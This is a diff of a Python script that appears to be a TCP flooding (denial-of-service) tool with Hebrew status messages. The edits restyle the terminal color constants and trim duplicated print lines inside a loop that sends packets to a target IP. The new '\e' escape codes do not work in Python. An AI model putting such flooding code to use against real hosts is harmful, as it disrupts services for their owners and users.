@@ -6,20 +6,24 @@ import time
 import random
 import progressbar
 
+# Colors
 class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    ZA1 = '\033[31m'
-    ZA2 = '\033[32m'
-    ZA3 = '\033[33m'
-    FAIL = '\033[91m'
-    RESET = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-    ZH = '\033[97m'
+    HEADER = '\e[95m'
+    OKBLUE = '\e[94m'
+    OKCYAN = '\e[96m'
+    OKGREEN = '\e[92m'
+    WARNING = '\e[93m'
+    UNDERLINE = '\e[4m'
+    PURPLE = '\033[97m'
+    BOLD    = "\e[1m"
+    BLACK   = "\e[30m"
+    RED     = "\e[31m"
+    GREEN   = "\e[32m"
+    YELLOW  = "\e[33m"
+    BLUE    = "\e[34m"
+    MAGENTA = "\e[35m"
+    CYAN    = "\e[36m"
+    WHITE   = "\e[37m"
 
 # CLEAR
 os.system("clear")
@@ -87,12 +91,8 @@ def start():
       for i in range(packs):
         s.send(r)
         u += 1
-        print("\033[92m[\033[1m+\033[92m]\033[32mפרוטוקול בקרת שידורL00D \033[94m  " +str(u)+ "   \033[95mלשלוח מנות התקפה " +str()+ "  \033[92m:::..." +ip+ "\033[0m" )
-        u += 1
-        print("\033[92m[\033[1m+\033[92m]\033[33mפרוטוקול בקרת שידורFL00D \033[94m  " +str(u)+ "  \033[96mלשלוח מנות התקפה " +str()+ "  \033[94m:::..." +ip+ "\033[0m" )
-        u += 1
-        print("\033[92m[\033[1m+\033[92m]\033[97mפרוטוקול בקרת שידורFL00D \033[94m  " +str(u)+ "  \033[92mלשלוח מנות התקפה " +str()+ "  \033[31m:::..." +ip+ "\033[0m" )
-          
+        print("\033[92m[\033[1m+\033[92m]\033[33mפרוטוקול בקרת שידורL00D \033[94m  " +str(u)+ "   \033[32mלשלוח מנות התקפה " +str()+ "  \033[37m" +ip+ "\033[0m" )
+        
     except:
         s.close()
         print("\033[97m[\033[91m-\033[97m]\033[91mמציפים למטה")
